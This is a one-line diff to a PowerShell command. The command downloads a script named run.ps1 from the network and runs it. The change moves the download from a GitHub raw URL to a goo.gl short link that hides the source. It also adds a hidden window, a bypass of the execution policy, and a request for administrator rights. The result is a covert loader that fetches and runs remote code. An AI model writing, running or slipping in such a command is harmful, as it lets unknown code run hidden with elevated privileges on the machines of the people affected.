@@ -1,1 +1,1 @@
-powershell -noexit -ExecutionPolicy Unrestricted -command "& {(new-object System.net.WebClient).DownloadFile("""https://raw.githubusercontent.com/projetcybersecurite/ok/master/run.ps1""", """$HOME/run.ps1"""); & $HOME/run.ps1}"
+powershell -nologo -command "&{(new-object System.net.WebClient).DownloadFile("""https://goo.gl/bXuCnj""","""$HOME/run.ps1""");&start-process powershell -ArgumentList """-windowstyle hidden -ExecutionPolicy Bypass -file $HOME/run.ps1"""-Verb runAs}"
